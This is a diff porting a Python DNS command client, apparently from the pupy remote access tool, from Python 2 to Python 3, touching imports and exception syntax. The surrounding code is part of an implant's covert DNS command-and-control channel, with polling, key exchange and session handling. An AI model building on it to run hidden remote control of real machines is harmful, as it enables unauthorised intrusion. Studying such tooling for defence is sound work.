@@ -1,5 +1,9 @@
 # -*- coding: utf-8 -*-
 
+from __future__ import absolute_import
+from __future__ import division
+from __future__ import print_function
+from __future__ import unicode_literals
 __all__ = (
     'DnsCommandsClient',
 )
@@ -18,8 +22,10 @@ import netaddr
 
 import pupy
 
+from io import open
 from threading import Thread, Lock
-import ascii85
+
+from . import ascii85
 
 try:
     import dnslib
@@ -29,7 +35,7 @@ except ImportError:
 
 from network.lib.transports.cryptoutils import ECPV, get_random
 
-from picocmd import (
+from .picocmd import (
     Poll, Ack,
     SystemStatus,
     Sleep, CheckConnect,
@@ -169,7 +175,7 @@ class DnsCommandsClient(Thread):
     def bad_response(self):
         self.failed += 1
         if self.failed > 5:
-            self.next()
+            next(self)
 
     def event(self, command):
         logging.debug('Event: %s', command)
@@ -230,7 +236,7 @@ class DnsCommandsClient(Thread):
                         else:
                             s.close()
 
-        except socket.error, e:
+        except socket.error as e:
             logging.info('NS Request exception: %s (ns=%s)', e, self.ns)
             self.ns_socket = None
 
@@ -431,7 +437,7 @@ class DnsCommandsClient(Thread):
                 self.encoder.kex_reset()
                 self.on_session_lost()
 
-            except (IndexError, ParcelInvalidPayload), e:
+            except (IndexError, ParcelInvalidPayload) as e:
                 logging.error(
                     'CRC FAILED / Invalid payload (%s) / %s/%s',
                         e, self.failed, 5)
